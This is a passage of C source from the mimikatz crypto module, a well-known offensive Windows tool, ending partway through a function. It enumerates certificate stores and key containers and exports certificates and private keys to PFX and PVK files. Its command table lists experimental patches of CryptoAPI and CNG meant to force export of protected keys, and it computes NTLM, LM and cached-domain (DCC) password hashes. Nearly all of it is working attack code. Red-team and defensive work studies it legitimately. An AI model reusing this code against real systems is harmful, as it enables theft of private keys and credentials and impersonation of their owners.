/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_crypto.h"

HMODULE kuhl_m_crypto_hRsaEnh = NULL;

const KUHL_M_C kuhl_m_c_crypto[] = {
	{kuhl_m_crypto_l_providers,		L"providers",		L"List cryptographic providers"},
	{kuhl_m_crypto_l_stores,		L"stores",			L"List cryptographic stores"},
	{kuhl_m_crypto_l_certificates,	L"certificates",	L"List (or export) certificates"},
	{kuhl_m_crypto_l_keys,			L"keys",			L"List (or export) keys containers"},
	{kuhl_m_crypto_l_sc,			L"sc",				L"List smartcard readers"},
	{kuhl_m_crypto_hash,			L"hash",			L"Hash a password with optional username"},
	{kuhl_m_crypto_system,			L"system",			L"Describe a Windows System Certificate (file, TODO:registry or hive)"},
	{kuhl_m_crypto_c_sc_auth,		L"scauth",			L"Create a authentication certitifate (smartcard like) from a CA"},
	{kuhl_m_crypto_c_cert_to_hw,	L"certtohw",		L"Try to export a software CA to a crypto (virtual)hardware"},

	{kuhl_m_crypto_p_capi,			L"capi",			L"[experimental] Patch CryptoAPI layer for easy export"},
	{kuhl_m_crypto_p_cng,			L"cng",				L"[experimental] Patch CNG service for easy export"},

	{kuhl_m_crypto_extract,			L"extract",			L"[experimental] Extract keys from CAPI RSA/AES provider"},
};

const KUHL_M kuhl_m_crypto = {
	L"crypto", L"Crypto Module", NULL,
	ARRAYSIZE(kuhl_m_c_crypto), kuhl_m_c_crypto, kuhl_m_crypto_init, kuhl_m_crypto_clean
};

NTSTATUS kuhl_m_crypto_init()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	if(kuhl_m_crypto_hRsaEnh = LoadLibrary(L"rsaenh"))
		if(K_CPExportKey = (PCP_EXPORTKEY) GetProcAddress(kuhl_m_crypto_hRsaEnh, "CPExportKey"))
			status = STATUS_SUCCESS;
	return status;
}

NTSTATUS kuhl_m_crypto_clean()
{
	if(kuhl_m_crypto_hRsaEnh)
		if(FreeLibrary(kuhl_m_crypto_hRsaEnh))
			K_CPExportKey = NULL;
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[])
{
	DWORD provType, tailleRequise, index = 0;
	wchar_t * monProvider;
	PCWCHAR name;
	PCRYPT_PROVIDERS pBuffer = NULL;
	HCRYPTPROV hProv;

	kprintf(L"\nCryptoAPI providers :\n");
	while(CryptEnumProviders(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviders(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u)", index, name ? name : L"?", provType);
				if(CryptAcquireContext(&hProv, NULL, monProvider, provType, CRYPT_VERIFYCONTEXT))
				{
					tailleRequise = sizeof(DWORD);
					if(CryptGetProvParam(hProv, PP_IMPTYPE, (PBYTE) &provType, &tailleRequise, 0))
						kprintf(L" %c", (provType & CRYPT_IMPL_HARDWARE) ? L'H' : L' ');
					CryptReleaseContext(hProv, 0);
				}
				kprintf(L" - %s\n", monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviders");

	index = 0;
	kprintf(L"\nCryptoAPI provider types:\n");
	while(CryptEnumProviderTypes(index, NULL, 0, &provType, NULL, &tailleRequise))
	{
		if(monProvider = (wchar_t *) LocalAlloc(LPTR, tailleRequise))
		{
			if(CryptEnumProviderTypes(index, NULL, 0, &provType, monProvider, &tailleRequise))
			{
				name = kull_m_crypto_provider_type_to_name(provType);
				kprintf(L"%2u. %-13s (%2u) - %s\n", index, name ? name : L"?", provType, monProvider);
			}
			LocalFree(monProvider);
		}
		index++;
	}
	if(GetLastError() != ERROR_NO_MORE_ITEMS)
		PRINT_ERROR_AUTO(L"CryptEnumProviderTypes");

	kprintf(L"\nCNG providers :\n");
	__try 
	{

		if(NT_SUCCESS(BCryptEnumRegisteredProviders(&tailleRequise, &pBuffer)))
		{
			for(index = 0; index < pBuffer->cProviders; index++)
				kprintf(L"%2u. %s\n", index, pBuffer->rgpszProviders[index]);
			BCryptFreeBuffer(pBuffer);
		}
		else PRINT_ERROR_AUTO(L"BCryptEnumRegisteredProviders");
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_crypto_l_stores(int argc, wchar_t * argv[])
{
	DWORD dwSystemStore, nbStore = 0;
	PCWCHAR szSystemStore;
	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kprintf(L"Asking for System Store \'%s\' (0x%08x)\n", szSystemStore, dwSystemStore);

	if(!CertEnumSystemStore(dwSystemStore, NULL, &nbStore, kuhl_m_crypto_l_stores_enumCallback_print))
		PRINT_ERROR_AUTO(L"CertEnumSystemStore");

	return STATUS_SUCCESS;
}

BOOL WINAPI kuhl_m_crypto_l_stores_enumCallback_print(const void *pvSystemStore, DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved, void *pvArg)
{
	kprintf(L"%2u. %s\n", (*((DWORD *) pvArg))++, (wchar_t *) pvSystemStore);
	return TRUE;
}

const DWORD nameSrc[] = {CERT_NAME_FRIENDLY_DISPLAY_TYPE, CERT_NAME_DNS_TYPE, CERT_NAME_EMAIL_TYPE, CERT_NAME_UPN_TYPE, CERT_NAME_URL_TYPE};
NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[])
{
	HCERTSTORE hCertificateStore;
	PCCERT_CONTEXT pCertContext;
	DWORD i, j, dwSizeNeeded, keySpec, flags = CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG;
	wchar_t *certName;
	PCRYPT_KEY_PROV_INFO pBuffer;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv;
	HCRYPTKEY maCle;
	BOOL noKey, keyToFree;

	PCWCHAR szSystemStore, szStore, name;
	DWORD dwSystemStore = 0;

	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		flags |= CRYPT_ACQUIRE_SILENT_FLAG;
	noKey = kull_m_string_args_byName(argc, argv, L"nokey", NULL, NULL);

	kull_m_string_args_byName(argc, argv, L"systemstore", &szSystemStore, L"CURRENT_USER"/*kuhl_m_crypto_system_stores[0].name*/);
	dwSystemStore = kull_m_crypto_system_store_to_dword(szSystemStore);
	kull_m_string_args_byName(argc, argv, L"store", &szStore, L"My");

	kprintf(L" * System Store  : \'%s\' (0x%08x)\n"
			L" * Store         : \'%s\'\n\n",
			szSystemStore, dwSystemStore,
			szStore);

	if(hCertificateStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, dwSystemStore | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, szStore))
	{
		for (i = 0, pCertContext = CertEnumCertificatesInStore(hCertificateStore, NULL); pCertContext != NULL; pCertContext = CertEnumCertificatesInStore(hCertificateStore, pCertContext), i++) // implicit CertFreeCertificateContext
		{
			for(j = 0; j < ARRAYSIZE(nameSrc); j++)
			{
				dwSizeNeeded = CertGetNameString(pCertContext, nameSrc[j], 0, NULL, NULL, 0);
				if(dwSizeNeeded > 0)
				{
					if(certName = (wchar_t *) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
					{
						if(CertGetNameString(pCertContext, nameSrc[j], 0, NULL, certName, dwSizeNeeded) == dwSizeNeeded)
						{
							kprintf(L"%2u. %s\n", i, certName);
							dwSizeNeeded = 0;
							if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
							{
								if(pBuffer = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwSizeNeeded))
								{
									if(CertGetCertificateContextProperty(pCertContext, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
									{
										name = kull_m_crypto_provider_type_to_name(pBuffer->dwProvType);
										kprintf(
											L"\tKey Container  : %s\n"
											L"\tProvider       : %s\n"
											L"\tProvider type  : %s (%u)\n",
											(pBuffer->pwszContainerName ? pBuffer->pwszContainerName : L"(null)"),
											(pBuffer->pwszProvName ? pBuffer->pwszProvName : L"(null)"),
											name ? name : L"?", pBuffer->dwProvType);
										
										if(!noKey)
										{
											if(CryptAcquireCertificatePrivateKey(pCertContext, flags, NULL, &monProv, &keySpec, &keyToFree))
											{
												kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(keySpec), keySpec);

												if(keySpec != CERT_NCRYPT_KEY_SPEC)
												{
													if(CryptGetUserKey(monProv, keySpec, &maCle))
													{
														kuhl_m_crypto_printKeyInfos(0, maCle);
														CryptDestroyKey(maCle);
													}
													else PRINT_ERROR_AUTO(L"CryptGetUserKey");

													if(keyToFree)
														CryptReleaseContext(monProv, 0);
												}
												else
												{
													__try
													{
														kuhl_m_crypto_printKeyInfos(monProv, 0);
														if(keyToFree)
															NCryptFreeObject(monProv);
													}
													__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
													{
														PRINT_ERROR(L"keySpec == CERT_NCRYPT_KEY_SPEC without CNG Handle ?\n");
													}
												}
											}
											else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey");
										}
									}
									else PRINT_ERROR_AUTO(L"CertGetCertificateContextProperty");
									LocalFree(pBuffer);
								}
								if(!export)
									kprintf(L"\n");
							}

							if(export)
								kuhl_m_crypto_exportCert(pCertContext, (BOOL) dwSizeNeeded, szSystemStore, szStore, i, certName);

						}
						else PRINT_ERROR_AUTO(L"CertGetNameString");
						LocalFree(certName);
					}
					break;
				}
				else PRINT_ERROR_AUTO(L"CertGetNameString (for len)");
			}
		}
		CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
	}
	else PRINT_ERROR_AUTO(L"CertOpenStore");

	return STATUS_SUCCESS;
}

void kuhl_m_crypto_l_keys_capi(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags, BOOL export, LPCWSTR szStore)
{
	HCRYPTPROV hCryptProv, hCryptKeyProv;
	HCRYPTKEY hCapiKey;
	DWORD i, dwSizeNeeded, dwUniqueSizeNeeded, ks, CRYPT_first_next = CRYPT_FIRST, dwContainer = szContainer ? (DWORD) wcslen(szContainer) : 0, dwSubContainer;
	BOOL success;
	char *aContainerName, *aUniqueName;
	wchar_t *containerName, *fullContainer;

	if(CryptAcquireContext(&hCryptProv, szContainer, szProvider, dwProvType, CRYPT_VERIFYCONTEXT | dwFlags))
	{
		success = CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, NULL, &dwSizeNeeded, CRYPT_first_next);
		if(aContainerName = (char *) LocalAlloc(LPTR, dwSizeNeeded))
		{
			i = 0;
			while(success)
			{
				if(success = (CryptGetProvParam(hCryptProv, PP_ENUMCONTAINERS, (BYTE *) aContainerName, &dwSizeNeeded, CRYPT_first_next)))
				{
					if(containerName = kull_m_string_qad_ansi_to_unicode(aContainerName))
					{
						kprintf(L"    %u. %s\n", i,  containerName);
						dwSubContainer = (DWORD) wcslen(containerName);

						if(fullContainer = (wchar_t *) LocalAlloc(LPTR, (dwContainer + dwSubContainer + 1) * sizeof(wchar_t)))
						{
							if(dwContainer)
								RtlCopyMemory(fullContainer, szContainer, dwContainer * sizeof(wchar_t));
							RtlCopyMemory(fullContainer + dwContainer, containerName, dwSubContainer * sizeof(wchar_t));

							if(CryptAcquireContext(&hCryptKeyProv, fullContainer, szProvider, dwProvType, dwFlags))
							{
								if(CryptGetProvParam(hCryptKeyProv, PP_UNIQUE_CONTAINER, NULL, &dwUniqueSizeNeeded, 0))
								{
									if(aUniqueName = (char *) LocalAlloc(LPTR, dwUniqueSizeNeeded))
									{
										if(CryptGetProvParam(hCryptKeyProv, PP_UNIQUE_CONTAINER, (BYTE *) aUniqueName, &dwUniqueSizeNeeded, 0))
											kprintf(L"    %S\n", aUniqueName);
										LocalFree(aUniqueName);
									}
								}

								for(ks = AT_KEYEXCHANGE, hCapiKey = 0; (ks <= AT_SIGNATURE) && !CryptGetUserKey(hCryptKeyProv, ks, &hCapiKey); ks++);
								if(hCapiKey)
								{
									kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(ks), ks);
									kuhl_m_crypto_printKeyInfos(0, hCapiKey);
									if(export)
										kuhl_m_crypto_exportKeyToFile(0, hCapiKey, ks, szStore, i, containerName);
									CryptDestroyKey(hCapiKey);
								}
								else PRINT_ERROR_AUTO(L"CryptGetUserKey");
							}
							LocalFree(fullContainer);
						}
						kprintf(L"\n");
						LocalFree(containerName);
					}
				}
				CRYPT_first_next = CRYPT_NEXT;
				i++;
			}
			if(GetLastError() != ERROR_NO_MORE_ITEMS)
				PRINT_ERROR_AUTO(L"CryptGetProvParam");

			CryptReleaseContext(hCryptProv, 0);
			LocalFree(aContainerName);
		}
	}
	else PRINT_ERROR_AUTO(L"CryptAcquireContext");
}

void kuhl_m_crypto_l_keys_cng(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwFlags, BOOL export, LPCWSTR szStore)
{
	NCRYPT_PROV_HANDLE hProvider;
	NCryptKeyName * pKeyName;
	PVOID pEnumState = NULL;
	SECURITY_STATUS retour;
	NCRYPT_KEY_HANDLE hCngKey;
	DWORD i, dwUniqueSizeNeeded;
	wchar_t *uUniqueName;

	__try
	{
		if(NT_SUCCESS(retour = NCryptOpenStorageProvider(&hProvider, szProvider, 0)))
		{
			i = 0;
			while(NT_SUCCESS(retour = NCryptEnumKeys(hProvider, szContainer, &pKeyName, &pEnumState, dwFlags)))
			{
				kprintf(L"    %u. %s\n", i,  pKeyName->pszName);

				if(NT_SUCCESS(retour = NCryptOpenKey(hProvider, &hCngKey, pKeyName->pszName, 0, dwFlags)))
				{
					if(NT_SUCCESS(NCryptGetProperty(hCngKey, NCRYPT_UNIQUE_NAME_PROPERTY, NULL, 0, &dwUniqueSizeNeeded, 0)))
					{
						if(uUniqueName = (wchar_t *) LocalAlloc(LPTR, dwUniqueSizeNeeded))
						{
							if(NT_SUCCESS(NCryptGetProperty(hCngKey, NCRYPT_UNIQUE_NAME_PROPERTY, (BYTE *) uUniqueName, dwUniqueSizeNeeded, &dwUniqueSizeNeeded, 0)))
								kprintf(L"    %s\n", uUniqueName);
							LocalFree(uUniqueName);
						}
					}
					kuhl_m_crypto_printKeyInfos(hCngKey, 0);
					if(export)
						kuhl_m_crypto_exportKeyToFile(hCngKey, 0, AT_KEYEXCHANGE, szStore, i, pKeyName->pszName);
					NCryptFreeObject(hCngKey);
				}
				else PRINT_ERROR(L"NCryptOpenKey %08x\n", retour);
				kprintf(L"\n");
				NCryptFreeBuffer(pKeyName);
				i++;
			}
			if(retour != NTE_NO_MORE_ITEMS)
				PRINT_ERROR(L"NCryptEnumKeys %08x\n", retour);

			if(pEnumState)
				NCryptFreeBuffer(pEnumState);
			NCryptFreeObject(hProvider);
		}
		else PRINT_ERROR(L"NCryptOpenStorageProvider %08x\n", retour);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
}

NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[])
{
	PCWCHAR szProvider, pProvider, szProviderType, szStore, szCngProvider;
	DWORD dwProviderType, dwFlags = 0;
	
	BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	
	kull_m_string_args_byName(argc, argv, L"provider", &szProvider, L"MS_ENHANCED_PROV");
	if(!(pProvider = kull_m_crypto_provider_to_realname(szProvider)))
		pProvider = szProvider;
	
	kull_m_string_args_byName(argc, argv, L"providertype", &szProviderType, L"PROV_RSA_FULL");
	if(!(dwProviderType = kull_m_crypto_provider_type_to_dword(szProviderType)))
		dwProviderType = wcstoul(szProviderType, NULL, 0);

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		dwFlags = CRYPT_MACHINE_KEYSET; // same as NCRYPT_MACHINE_KEY_FLAG :)
	szStore = dwFlags ? L"machine" : L"user";
	
	if(kull_m_string_args_byName(argc, argv, L"silent", NULL, NULL))
		dwFlags |= CRYPT_SILENT;

	kull_m_string_args_byName(argc, argv, L"cngprovider", &szCngProvider, MS_KEY_STORAGE_PROVIDER);

	kprintf(L" * Store         : \'%s\'\n"	
			L" * Provider      : \'%s\' (\'%s\')\n"
			L" * Provider type : \'%s\' (%u)\n"
			L" * CNG Provider  : \'%s\'\n",
			szStore,
			szProvider, pProvider,
			szProviderType, dwProviderType,
			szCngProvider);

	kprintf(L"\nCryptoAPI keys :\n");
	kuhl_m_crypto_l_keys_capi(NULL, pProvider, dwProviderType, dwFlags, export, szStore);
	kprintf(L"\nCNG keys :\n");
	kuhl_m_crypto_l_keys_cng(NULL, szCngProvider, dwFlags, export, szStore);
	return STATUS_SUCCESS;
}

void kuhl_m_crypto_printKeyInfos(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv, HCRYPTKEY maCle)
{
	BOOL isExportable, keyOperation = FALSE;
	DWORD keySize, dwSizeNeeded;
	if(monProv)
	{
		__try 
		{
			keyOperation = NT_SUCCESS(NCryptGetProperty(monProv, NCRYPT_EXPORT_POLICY_PROPERTY, (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));
			isExportable = (keySize & NCRYPT_ALLOW_EXPORT_FLAG);
			keyOperation &= NT_SUCCESS(NCryptGetProperty(monProv, NCRYPT_LENGTH_PROPERTY,  (BYTE *) &keySize, sizeof(DWORD), &dwSizeNeeded, 0));

			if(!keyOperation)
				PRINT_ERROR_AUTO(L"NCryptGetProperty");
		}
		__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	}
	else if(maCle)
	{
		dwSizeNeeded = sizeof(DWORD);
		keyOperation = CryptGetKeyParam(maCle, KP_PERMISSIONS, (BYTE *) &keySize, &dwSizeNeeded, 0);
		isExportable = (keySize & CRYPT_EXPORT);

		dwSizeNeeded = sizeof(DWORD);
		keyOperation &= CryptGetKeyParam(maCle, KP_KEYLEN, (BYTE *) &keySize, &dwSizeNeeded, 0);

		if(!keyOperation)
			PRINT_ERROR_AUTO(L"CryptGetKeyParam");
	}

	if(keyOperation)
		kprintf(
		L"\tExportable key : %s\n"
		L"\tKey size       : %u\n",
		(isExportable ? L"YES" : L"NO"), keySize);
}

void kuhl_m_crypto_exportRawKeyToFile(LPCVOID data, DWORD size, BOOL isCNG, const wchar_t * store, const DWORD index, const wchar_t * name, BOOL wantExport, BOOL wantInfos)
{
	BOOL status = FALSE;
	NCRYPT_PROV_HANDLE hCngProv = 0;
	NCRYPT_KEY_HANDLE hCngKey = 0;
	DWORD exportPolicy = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
	HCRYPTPROV hCapiProv = 0;
	HCRYPTKEY hCapiKey = 0;

	if(isCNG)
	{
		__try
		{
			if(NT_SUCCESS(NCryptOpenStorageProvider(&hCngProv, MS_KEY_STORAGE_PROVIDER, 0)))
			{
				if(NT_SUCCESS(NCryptImportKey(hCngProv, 0, BCRYPT_RSAPRIVATE_BLOB, NULL, &hCngKey, (PBYTE) data, size, 0)))
				{
					if(!NT_SUCCESS(NCryptSetProperty(hCngKey, NCRYPT_EXPORT_POLICY_PROPERTY, (PBYTE) &exportPolicy, sizeof(DWORD), 0)))
						PRINT_ERROR(L"NCryptSetProperty\n");
				}
				else PRINT_ERROR(L"NCryptImportKey\n");
			}
		}
		__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
		{
			PRINT_ERROR(L"No CNG!\n");
		}
	}
	else
	{
		if(CryptAcquireContext(&hCapiProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			if(!CryptImportKey(hCapiProv, (LPCBYTE) data, size, 0, CRYPT_EXPORTABLE, &hCapiKey))
				PRINT_ERROR_AUTO(L"CryptImportKey");
		}
	}

	if(hCngKey || hCapiKey)
	{
		if(wantInfos)
			kuhl_m_crypto_printKeyInfos(hCngKey, hCapiKey);
		if(wantExport)
			kuhl_m_crypto_exportKeyToFile(hCngKey, hCapiKey, AT_KEYEXCHANGE, store, 0, name);
		if(hCngKey) // we for sure know CNG is here
			NCryptFreeObject(hCngKey);
		if(hCapiKey)
			CryptDestroyKey(hCapiKey);
	}

	if(hCngProv) // same ;)
		NCryptFreeObject(hCngProv);
	if(hCapiProv)
		CryptReleaseContext(hCapiProv, 0);
}

void kuhl_m_crypto_exportKeyToFile(NCRYPT_KEY_HANDLE hCngKey, HCRYPTKEY hCapiKey, DWORD keySpec, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	BOOL isExported = FALSE;
	DWORD szExport, szPVK;
	PBYTE pExport = NULL;
	SECURITY_STATUS nCryptReturn;
	PVK_FILE_HDR pvkHeader = {PVK_MAGIC, PVK_FILE_VERSION_0, keySpec, PVK_NO_ENCRYPT, 0, 0};
	PCWCHAR provType = hCngKey ? L"cng" : L"capi";
	PWCHAR filenamebuffer;

	if(filenamebuffer = kuhl_m_crypto_generateFileName(store, provType, index, name, L"pvk"))
	{
		if(hCapiKey)
		{
			if(CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, NULL, &szExport))
			{
				szPVK = szExport + sizeof(PVK_FILE_HDR);
				if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
				{
					if(!CryptExportKey(hCapiKey, 0, PRIVATEKEYBLOB, 0, pExport + sizeof(PVK_FILE_HDR), &szExport))
						pExport = (PBYTE) LocalFree(pExport);
				}
			}
		}
		else if(hCngKey)
		{
			__try
			{
				nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, NULL, 0, &szExport, 0);
				if(nCryptReturn == ERROR_SUCCESS)
				{
					szPVK = szExport + sizeof(PVK_FILE_HDR);
					if(pExport = (PBYTE) LocalAlloc(LPTR, szPVK))
					{
						nCryptReturn = NCryptExportKey(hCngKey, 0, LEGACY_RSAPRIVATE_BLOB, NULL, pExport + sizeof(PVK_FILE_HDR), szExport, &szExport, 0);
						if(nCryptReturn != ERROR_SUCCESS)
							pExport = (PBYTE) LocalFree(pExport);
					}
				}
				SetLastError(nCryptReturn);
			}
			__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
			{
				SetLastError(ERROR_DLL_NOT_FOUND);
			}
		}

		if(pExport)
		{
			pvkHeader.cbPvk = szExport;
			RtlCopyMemory(pExport, &pvkHeader, sizeof(PVK_FILE_HDR));
			isExported = kull_m_file_writeData(filenamebuffer, pExport, szPVK);
			LocalFree(pExport);
		}

		kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", filenamebuffer);
		else
			PRINT_ERROR_AUTO(L"Export / CreateFile");
	}
	else
		PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
}

void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, const wchar_t * systemStore, const wchar_t * store, const DWORD index, const wchar_t * name)
{
	wchar_t *fileNameBuffer;
	BOOL isExported;
	HCERTSTORE hTempStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL); 
	PCCERT_CONTEXT  pCertContextCopy = NULL;
	CRYPT_DATA_BLOB bDataBlob = {0, NULL};

	if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"der"))
	{
		isExported = kull_m_file_writeData(fileNameBuffer, pCertificate->pbCertEncoded, pCertificate->cbCertEncoded);
		kprintf(L"\tPublic export  : %s - ", isExported ? L"OK" : L"KO");
		if(isExported)
			kprintf(L"\'%s\'\n", fileNameBuffer);
		else PRINT_ERROR_AUTO(L"CreateFile");
		LocalFree(fileNameBuffer);
	}
	else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	
	if(havePrivateKey)
	{
		if(fileNameBuffer = kuhl_m_crypto_generateFileName(systemStore, store, index, name, L"pfx"))
		{
			isExported = FALSE;
			if(CertAddCertificateContextToStore(hTempStore, pCertificate, CERT_STORE_ADD_NEW, &pCertContextCopy))
			{
				isExported = kull_m_crypto_exportPfx(hTempStore, fileNameBuffer);
				CertFreeCertificateContext(pCertContextCopy);
			}
			kprintf(L"\tPrivate export : %s - ", isExported ? L"OK" : L"KO");
			if(isExported)
				kprintf(L"\'%s\'\n", fileNameBuffer);
			else PRINT_ERROR_AUTO(L"Export / CreateFile");
			LocalFree(fileNameBuffer);
		}
		else PRINT_ERROR_AUTO(L"kuhl_m_crypto_generateFileName");
	}
	kprintf(L"\n");
	CertCloseStore(hTempStore, CERT_CLOSE_STORE_FORCE_FLAG);
}

wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext)
{
	wchar_t * buffer;
	size_t charCount = wcslen(term0) + 1 + wcslen(term1) + 1 + 10 + 1 + wcslen(name) + 1 + wcslen(ext) + 1;

	if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
	{
		if(swprintf_s(buffer, charCount, L"%s_%s_%u_%s.%s", term0, term1, index, name, ext) == -1)
			buffer = (wchar_t *) LocalFree(buffer);
		else
			kull_m_file_cleanFilename(buffer);
	}
	return buffer;
}

NTSTATUS kuhl_m_crypto_hash(int argc, wchar_t * argv[])
{
	PCWCHAR szCount, szPassword = NULL, szUsername = NULL;
	UNICODE_STRING uPassword, uUsername;/*, uTmp;
	ANSI_STRING aTmp;*/
	OEM_STRING oTmp;
	DWORD count = 10240;
	BYTE hash[LM_NTLM_HASH_LENGTH], dcc[LM_NTLM_HASH_LENGTH], md5[MD5_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], sha2[32];
	
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	kull_m_string_args_byName(argc, argv, L"user", &szUsername, NULL);
	if(kull_m_string_args_byName(argc, argv, L"count", &szCount, NULL))
		count = wcstoul(szCount, NULL, 0);

	RtlInitUnicodeString(&uPassword, szPassword);
	RtlInitUnicodeString(&uUsername, szUsername);
	if(NT_SUCCESS(RtlDigestNTLM(&uPassword, hash)))
	{
		kprintf(L"NTLM: "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		if(szUsername)
		{
			if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, 0)))
			{
				kprintf(L"DCC1: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				if(NT_SUCCESS(kull_m_crypto_get_dcc(dcc, hash, &uUsername, count)))
				{
					kprintf(L"DCC2: "); kull_m_string_wprintf_hex(dcc, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
				}
			}
		}
	}

	//if(NT_SUCCESS(RtlUpcaseUnicodeString(&uTmp, &uPassword, TRUE)))
	//{
	//	if(NT_SUCCESS(RtlUnicodeStringToAnsiString(&aTmp, &uTmp, TRUE)))
	//	{
	//		if(NT_SUCCESS(RtlDigestLM(aTmp.Buffer, hash)))
	//		{
	//			kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
	//		}
	//		RtlFreeAnsiString(&aTmp);
	//	}
	//	RtlFreeUnicodeString(&uTmp);
	//}

	if(NT_SUCCESS(RtlUpcaseUnicodeStringToOemString(&oTmp, &uPassword, TRUE)))
	{
		if(NT_SUCCESS(RtlDigestLM(oTmp.Buffer, hash)))
		{
			kprintf(L"LM  : "); kull_m_string_wprintf_hex(hash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
		}
		RtlFreeOemString(&oTmp);
	}

	if(kull_m_crypto_hash(CALG_MD5, uPassword.Buffer, uPassword.Length, md5, MD5_DIGEST_LENGTH))
		kprintf(L"MD5 : "); kull_m_string_wprintf_hex(md5, MD5_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA1, uPassword.Buffer, uPassword.Length, sha1, SHA_DIGEST_LENGTH))
		kprintf(L"SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(kull_m_crypto_hash(CALG_SHA_256, uPassword.Buffer, uPassword.Length, sha2, 32))
		kprintf(L"SHA2: "); kull_m_string_wprintf_hex(sha2, 32, 0); kprintf(L"\n");

	return STATUS_SUCCESS;
}

BOOL kuhl_m_crypto_system_data(PBYTE data, DWORD len, PCWCHAR originalName, BOOL isExport)
{
	BOOL status = FALSE;
	PCWCHAR name;
	PKUHL_M_CRYPTO_CERT_PROP prop;
	PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO provInfo;

	for(prop = (PKUHL_M_CRYPTO_CERT_PROP) data; (PBYTE) prop < (data + len); prop = (PKUHL_M_CRYPTO_CERT_PROP) ((PBYTE) prop + FIELD_OFFSET(KUHL_M_CRYPTO_CERT_PROP, data) + prop->size))
	{
		name = kull_m_crypto_cert_prop_id_to_name(prop->dwPropId);
		kprintf(L"[%04x/%x] %s\n", prop->dwPropId, prop->flags, name ? name : L"?");
		if(prop->size)
		{
			kprintf(L"  ");
			switch(prop->dwPropId)
			{
